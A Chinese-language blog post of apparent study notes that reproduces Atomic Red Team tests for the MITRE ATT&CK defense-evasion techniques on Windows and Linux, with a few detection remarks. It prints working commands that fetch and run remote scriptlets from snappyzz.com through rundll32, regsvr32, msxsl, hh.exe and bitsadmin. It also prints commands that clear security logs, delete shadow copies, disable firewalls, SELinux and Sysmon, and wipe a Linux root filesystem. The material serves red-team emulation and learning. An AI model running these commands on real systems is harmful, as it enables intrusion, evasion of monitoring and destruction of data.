---
layout: post
title: 跟着ATT&CK学安全之defense-evasion
excerpt: "跟着ATT&CK学安全之defense-evasion"
categories: [ATT&CK]
comments: true
---
#### T1009 - Binary Padding
通过向binary末尾来绕过基于hash的黑名单校验,同时较大的文件也可以绕过一些安全产品的检测

测试平台:macOS, Linux,其中count代表填充多少个字节
```bash
dd if=/dev/zero bs=1 count=10 >> filename
```
#### T1090 - Connection Proxy
不直接连接受害者的电脑而是使用代理,现成的工具包括[HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap.
##### 测试1 Connection Proxy
平台:macOS, Linux

让该终端走某个代理
```
export http_proxy=http://192.168.1.100:8080
export https_proxy=https://192.168.1.100:8080
export http_proxy=socks5://192.168.1.100:10800
export https_proxy=socks5://192.168.1.100:10800
```
清除
```
unset http_proxy
```
##### 测试2 portproxy reg key
平台:windows

在终端修改注册表键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4`

这个未完待续
#### T1143 - Hidden Window
通过在powershel中添加"-WindowStyle Hidden"参数来隐藏窗口
```bash
Start-Process notepad.exe -WindowStyle Hidden
```



### T1036 - Masquerading
Masquerading是为了逃避蓝队的查找,而进行的伪装.其中的一种方法是可执行文件放在一个通常受信任的目录中，或者给它一个合法的名字.或者文件名是一个和受信任文件相似的文件名.其中一个情况就是当common system utility被移动和修改名字,来避免被检测.这可以绕过基于文件名的检测,以及蓝队的眼睛:-).

还有一种是right-to-left覆盖(RTLO or RLO) ,它可以让文件名反过来,迷惑蓝队成员

红队还可以修改二进制文件的图标,产品描述等来迷惑蓝队成员

对于windows还有一种技术:对合法的工具集进行重命名,例如rundll32.exe,一个案例就是当合法的工具集移动到不同的目录中并且重命名来避免检查.其中一个滥用的受信任地址为`C:\Windows\System32`,有害的程序可以伪装成`"explorer.exe"和"svchost.exe"`来绕过检查.

对于linux系统,有一种技术就是在程序运行之后,修改它的名称和路径,防止检测,一个被滥用的新人地址就是`/bin`名称可以改为"rsyncd"和"dbus-inotifier"
###### 测试1 Masquerading as Windows LSASS process
复制cmd.exe并重命名,把它伪装成了lsass.exe
```bash
cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
cmd.exe /c %SystemRoot%\Temp\lsass.exe
```
清除
```
del /Q /F %SystemRoot%\Temp\lsass.exe
```
win10成功复现
###### 测试2 Masquerading as Linux crond process.
复制sh,重命名crond,然后运行它达到伪装的目的
```bash
cp /bin/sh /tmp/crond
/tmp/crond
```
成功复现
###### 测试3 Masquerading - cscript.exe running as notepad.exe
把cscript.exe伪装成notepad.exe
```bash
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
cmd.exe /c %APPDATA%\notepad.exe /B
```
清除
```
del /Q /F %APPDATA%\notepad.exe
```
win10成功复现
###### 测试4 Masquerading - wscript.exe running as svchost.exe
```bash
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
cmd.exe /c %APPDATA%\svchost.exe /B
```
win10成功复现
###### 测试5 Masquerading - powershell.exe running as taskhostw.exe
```bash
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe
```
win10成功复现
###### 测试6 Masquerading - non-windows exe running as windows exe
```
copy #{inputfile} #{outputfile}
$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036
```
win10成功复现
###### 测试7 Masquerading - windows exe running as different windows exe
```bash
copy #{inputfile} #{outputfile}
$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036
```
win10成功复现
###### 测试8 Malicious process Masquerading as LSM.exe
```bash
copy C:\Windows\System32\cmd.exe D:\lsm.exe
D:\lsm.exe /c echo T1036 > D:\T1036.txt
```
win10成功复现
### T1099 - Timestomp
Timestomping是一种修改文件时间(创建时间,修改时间)的技术,通常来将恶意文件和本文件夹其他的文件弄成相同的时间.
###### 测试1 Set a file's access timestamp
```bash
touch -a -t 197001010000.00 #{target_filename}
```
查看
```bash
stat aa.txt 
  File: ‘aa.txt’
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: fd01h/64769d	Inode: 398717      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 1970-01-01 00:00:00.000000000 +0800
Modify: 2020-01-20 16:20:47.700567652 +0800
Change: 2020-01-20 16:20:47.700567652 +0800

```
成功复现
###### 测试2 Set a file's modification timestamp
```bash
touch -m -t 197001010000.00 #{target_filename}
```
成功复现
###### 测试3 Set a file's creation timestamp
先修改系统时间,然后创建文件,然后再把系统时间修改过来
```
date -s "1990-01-01 00:00:00"
touch #{target_filename}
date -s "$NOW"
```
成功复现
###### 测试4 Modify file timestamps using reference file
```bash
touch -acmr #{reference_file_path} {target_file_path}
```
成功复现
###### 测试5 Windows - Modify file creation timestamp with PowerShell
还差3个windows的没弄
### T1127 - Trusted Developer Utilities
有许多工具集可以用来执行代码,它有合法的证书并且允许它运行其他程序,这类工具集包括:MSBuild DNX RCSI WinDbg/CDB Tracker等
###### 测试1 MSBuild Bypass Using Inline Tasks
使用msbuild.exe执行c#代码
```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe D:\pycharmproject\atomic-red-team-master\atomics\T1127\src\T1127.csproj
```
windows10上运行成功
### T1220 - XSL Script Processing
Extensible Stylesheet Language (XSL)是用来描述和渲染XML文件的.为了进行复杂的操作,XSL增加了不同的语言.红队可以使用它来运行二进制代码绕过白名单的检查.和Trusted Developer Utilities相似,msxsl.exe可以在本地或者远程运行JavaScript,虽然msxsl.exe不是默认安装了,但是红队可以打包它并放在客户端.msxsl.exe运行时接收两个参数,XML源文件和XSL stylesheet.既然xsl文件也是一个xml,红队可以使用xsl文件两次,当msxsl.exe运行的时候,红队可以给xml/xsl文件任意的扩展名

命令行的例子如下:

- msxsl.exe customers[.]xml script[.]xsl
- msxsl.exe script[.]xsl script[.]xsl
- msxsl.exe script[.]jpeg script[.]jpeg

另一种技术叫做Squiblytwo,它使用windows管理工具调用JScript或VBScript在xsl文件中,这个技术也可以执行远程或本地的script.和Regsvr32一样,Squiblydoo也是一个windows信任的工具

命令行的例子如下:

- Local File: wmic process list /FORMAT:evil[.]xsl
- Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”
###### 测试1 MSXSL Bypass using local files
首先需要下载工具https://www.microsoft.com/en-us/download/details.aspx?id=21714
```
C:\Windows\Temp\msxsl.exe msxslxmlfile.xml msxslscript.xsl
```
win10成功复现(关闭病毒防护)
###### 测试2 
```
msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.xsl
```
win10成功复现(关闭病毒防护)

剩下两个没有复现成功

### T1064 - Scripting
这个太简单了,略过
### T1085 - Rundll32
rundll32.exe可以用来调用二进制文件.红队可以利用这个特点调用恶意软件来绕过系统防护,rundll32.exe也可以运行.cpl文件,双击.cpl文件也可以造成rundll32.exe的运行.

Rundll32 也可以运行JavaScript,语法类似如下
```
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"
```
###### 测试1 Rundll32 execute JavaScript Remote Payload With GetObject
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://snappyzz.com/T1085.sct").Exec();
```
win10成功复现
###### 测试2 Rundll32 execute VBscript command
```
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
```
win10成功复现
###### 测试3 Rundll32 advpack.dll Execution
```
rundll32.exe advpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
win10成功复现
###### 测试4 Rundll32 ieadvpack.dll Execution
```
rundll32.exe ieadvpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
**没有复现成功**
###### 测试5 Rundll32 syssetup.dll Execution
```
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
win10成功复现
###### 测试6 Rundll32 setupapi.dll Execution
```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
**没有复现成功**
### T1117 - Regsvr32
Regsvr32.exe是一个命令行程序,用来注册和删除object linking和嵌入命令,加载dll. Regsvr32也可以用来运行二进制文件.

红队可以利用它来运行代码来绕过一些防护,其中Regsvr32也是一个有微软签名的文件

regsvr32.exe也可以加载COM scriptlets来运行dll,regsvr32也可以加载远程文件来运行.regsvr32也通过Component Object Model Hijacking用来注册 COM Object来进行persistence
###### 测试1 Regsvr32 local COM scriptlet execution
```
regsvr32.exe /s /u /i:C:\Users\zhang\Desktop\atomic-red-team-master\atomics\T1117\RegSvr32.sct scrobj.dll
```
win10成功复现
###### 测试2 Regsvr32 remote COM scriptlet execution
```
regsvr32.exe /s /u /i:http://snappyzz.com/RegSvr32.sct scrobj.dll
```
win10成功复现
###### 测试3 Regsvr32 local DLL execution
```
"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll) ELSE ( regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll )"
```
项目找不到dll文件,没有进行复现,应该是有个命令创建dll的懒得找了
### T1121 - Regsvcs/Regasm
Regsvcs和Regasm是用来注册.NET COM的命令行工具.都有微软的签名.红队可以使用它们来运行程序.
###### 测试1 Regasm Uninstall Method Call Test
注意使用绝对路径
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
例如
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
```
检测方法也是类似regasm.exe这种进程名称的监控

win10成功复现
###### 测试2 Regsvs Uninstall Method Call Test
在powershell中运行
```
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
例如
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
```
检测方法也是类似regasm.exe这种进程名称的监控

win10成功复现
### T1126 - Network Share Connection Removal
可以使用`net use \\system\share /delete`来删除不使用的共享连接,红队可以使用它来隐藏自己的痕迹
###### 测试1 Add Network Share
```
net share test=D:\test /REMARK:"test share" /CACHE:No
```
win10成功复现
###### 测试2 Remove Network Share
```
net share D:\test /delete
```
win10成功复现
###### 测试3 Remove Network Share PowerShell
```
Remove-SmbShare -Name D:\test
Remove-FileShare -Name D:\test
```
命令不对,没有成功复现
### T1202 - Indirect Command Execution
许多windows工具集可以运行命令,例如`pcalua.exe`红队可以使用这个运行命令
###### 测试1 Indirect Command Execution - pcalua.exe
```
pcalua.exe -a #{process}
pcalua.exe -a #{payload_path}
pcalua.exe -a #{payload_cpl_path}
例如
pcalua.exe -a calc
```
win10成功复现
###### 测试2 Indirect Command Execution - forfiles.exe
```
forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
```
win10成功复现
### T1070 - Indicator Removal on Host
红队可以通过删除系统日志和潜在的captured文件来隐藏自己.例如删除linux`/var/log/ `中的所有文件

对于windows时间的日志:它记录了电脑的报警和提醒,系统定义了三种事件:系统级别,应用级别,安全

红队的操作与账号管理.账户登陆,服务操作等等,他们可以通过清除事件来隐藏自己的活动.清除事件的命令如下
- wevtutil cl system
- wevtutil cl application
- wevtutil cl security
###### 测试1 Clear Logs
```
wevtutil cl #{log_name}
例如
wevtutil cl security
```
win10成功复现
###### 测试2 FSUtil
USN Journal (Update Sequence Number Journal)，也称作Change Journal，用来记录NTFS volume中文件修改的信息，能够提高搜索文件的效率

每个NTFS volume对应一个USN Journal，存储在NTFS metafile的$Extend\$UsnJrnl中，也就是说，不同的NTFS volume对应的USN Journal不同

USN Journal会记录文件和目录的创建、删除、修改、重命名和加解密操作
```
fsutil usn deletejournal /D C:
```
win10成功复现
###### 测试3 rm -rf
在linux中
```
rm -rf /var/log/system.log*
rm -rf /var/audit/*
```
成功复现
###### 测试4 Overwrite Linux Mail Spool
```
echo 0> /var/spool/mail/#{username}
```
成功复现
###### 测试5 Overwrite Linux Log
```
echo 0> #{log_path}
```
成功复现
###### 测试6 Delete Security Logs Using PowerShell
powershell中运行
```
$eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
Stop-Process -Id $eventLogId -Force
Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
```
重新启动服务
```
Start-Service -Name EventLog
```
win10成功复现
###### 测试7 Delete System Logs Using Clear-EventLogId
powershell中运行
```
Clear-EventLog -logname Application
```
应该可以复现
### T1107 - File Deletion
这个就是讲得怎么删除文件
###### 测试1 Delete a single file - Linux/macOS
```
rm -f #{file_to_delete}
```
成功复现
###### 测试2 Delete an entire folder - Linux/macOS
```
rm -rf #{folder_to_delete}
```
成功复现
###### 测试3  Overwrite and delete a file with shred
```
shred -u #{file_to_shred}
```
成功复现
###### 测试4 Delete a single file - Windows cmd
```
echo "T1107" > %temp%\T1107.txt
del /f  %temp%\T1107.txt
```
win10成功复现
###### 测试5 Delete an entire folder - Windows cmd
```
mkdir %temp%\T1107
rmdir /s /q %temp%\T1107
```
win10成功复现
###### 测试6 Delete a single file - Windows PowerShell
```
New-Item $env:TEMP\T1107.txt
Remove-Item -path $env:TEMP\T1107.txt
```
win10成功复现
###### 测试7 Delete an entire folder - Windows PowerShell
```
New-Item $env:TEMP\T1107 -ItemType Directory
Remove-Item -path $env:TEMP\T1107 -recurse
```
win10成功复现
###### 测试8 Delete VSS - vssadmin
通过vsadmin.exe删除卷影拷贝服务文件
```
vssadmin.exe Delete Shadows /All /Quiet
```
win10成功复现
###### 测试9 Delete VSS - wmic
```
wmic shadowcopy delete
```
win10成功复现
###### 测试10 wbadmin
删除Windows Backup catalogs.
```
wbadmin delete catalog -quiet
```
应该可以复现
###### 测试11 Delete Filesystem - Linux
这个测试删除了整个linux的文件系统,这个技术在Amnesia IoT病毒中使用过,这个操作危险有破坏性
```
rm -rf / --no-preserve-root > /dev/null 2> /dev/null
```
应该可以复现
###### 测试13 Delete-PrefetchFile
Prefetch是预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。之所以自动创建Prefetch文件夹，是为了加快系统启动的进程

删除prefetch文件是一种已知的anti-forensic技术
```
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
```
应该可以复现
### T1089 - Disabling Security Tools
红队可关闭安全工具来避免自己被检测到
###### 测试1 Disable iptables firewall
在linux上运行
```
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service iptables stop
  chkconfig off iptables
  service ip6tables stop
  chkconfig off ip6tables
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop firewalld
  systemctl disable firewalld
fi
```
成功复现
###### 测试2 Disable syslog
在linux上运行
```
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service rsyslog stop
  chkconfig off rsyslog
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop rsyslog
  systemctl disable rsyslog
fi
```
成功复现
###### 测试3 Disable Cb Response
Cb Response也是一个收集日志的,在linux上运行
```
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service cbdaemon stop
  chkconfig off cbdaemon
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop cbdaemon
  systemctl disable cbdaemon
fi
```
成功复现
###### 测试4 Disable SELinux
```
setenforce 0
```
成功复现
###### 测试8 Unload Sysmon Filter Driver
在不停止Sysmon的情况下,卸载filter driver
```
fltmc.exe unload #{sysmon_driver}
例如
fltmc.exe unload SysmonDrv
```
恢复
```
sc stop sysmon
fltmc.exe load #{sysmon_driver}
sc start sysmon
```
win10成功复现
###### 测试10 Uninstall Sysmon
```
sysmon -u
```
恢复
```
sysmon -i -accepteula
```
###### 测试11 AMSI Bypass - AMSI InitFailed
###### 测试12 AMSI Bypass - Remove AMSI Provider Reg Key
###### 测试13 Disable Arbitrary Security Windows Service
###### 测试14 Disable PowerShell Script Block Logging
###### 测试15 PowerShell Bypass of AntiMalware Scripting Interface
###### 测试16 Tamper with Windows Defender ATP PowerShell
###### 测试17 Tamper with Windows Defender Command Prompt
###### 测试18 Tamper with Windows Defender Registry
### T1500 - Compile After Delivery
为了绕过传输途径的检测,红队可以将代码传输,然后再编译.
###### 测试1 Compile After Delivery using csc.exe
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} #{input_file}
例如
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:D:\pycharmproject\atomic-red-team-master\atomics\T1500\src\calc.exe D:\pycharmproject\atomic-red-team-master\atomics\T1500\src\calc.cs
```
win10成功复现
### T1196 - Control Panel Items
控制面板允许用户查看和修改电脑配置,也可以将cpl文件作为参数,运行恶意文件,来绕过一些病毒检测
```bash
control.exe D:\pycharmproject\atomic-red-team-master\atomics\T1196\bin\calc.cpl	//这里cpl一定要采用绝对路径否则失败
```

检测:control.exe创建了rundll32进程,然后rundll32进程通过命令行参数运行了cpl代码,然后运行里calc

windows10上运行复现
### T1223 - Compiled HTML File
编译的html文件(.chm)可运行如下:HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.并通过hh.exe来打开他们,红队可用chm文件来隐藏一段payload,此技术也可以来绕过一些检测病毒检测.运行如下命令,或者直接打开文件
```
hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
```
通过procmon的hh.exe进行了process create操作,监控到了

windows10上成功复现

或者
```bash
hh.exe http://snappyzz.com/T1223.chm		\\这个没有成功复现
```
### T1197 - BITS Jobs
windows后台智能传输服务(BITS)是一个通过Component Object Model (COM)的低带宽,同步文件传输的服务.BITS是一个用来更新,传输信息和其他应用后台操作并且不会干扰其他应用网络.我们可以通过powershell和BITSAdmin来创建BITS jobs

红队可以使用BITS来下载,运行恶意代码,甚至清除这些恶意代码.BITS运行不需要新建文件或者修改注册表,而且没有防火墙的拦截
###### 测试1 Download & Execute
```
bitsadmin.exe /transfer /Download /priority Foreground http://snappyzz.com/calc.calc D:\bitsadmin_flag.ps1
```
win10 下载成功复现,运行没有成功复现
###### 测试2 Download & Execute via PowerShell BITS
```
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```
win10 下载成功复现,运行没有成功复现
###### 测试3 Persist, Download, & Execute
这个测试了bitsadmin调度一个BITS传输,并且通过多个步骤运行payload,默认这个job将持续90天
```
bitsadmin.exe /create  #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
bitsadmin.exe /complete AtomicBITS
bitsadmin.exe /resume #{bits_job_name}
```
例如
```
bitsadmin.exe /create  AtomicBITS
bitsadmin.exe /addfile AtomicBITS http://snappyzz.com/T1197.md D:\bitsadmin_flag.ps1
bitsadmin.exe /setnotifycmdline AtomicBITS  	C:\Windows\system32\notepad.exe %temp%\bitsadmin_flag.ps1
bitsadmin.exe /complete AtomicBITS
bitsadmin.exe /resume AtomicBITS
```
大概就是这个意思,估计是给的命令有问题,暂时没有复现成功
### T1148 - HISTCONTROL
`HISTCONTROL`这个环境变量决定什么命令要在`history`中保存,并在用户退出的时候保存在`~/.bash_history`.它可以通过`ignorespace`开头的"空格键"设置忽略命令,它也可以设置忽略重复命令通过"ignoredups",也可以设置"ignoreboth"来忽略以上两个,这意味着“ ls”不会被保存,而"ls"会被保存,红队可以使用这个方法来隐藏痕迹
###### 测试1 Disable history collection
```
export HISTCONTROL=ignoreboth
 ls #{evil_command}
```
然后输入第一个字符是空格的命令,然后就可以隐藏了

成功复现
### T1207 - DCShadow
关于Domain Controller:域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。

DCShadow通过注册和模仿Domain Controller来操纵AD域的数据

Mimikatz中已有模块实现这个功能

这个没法实现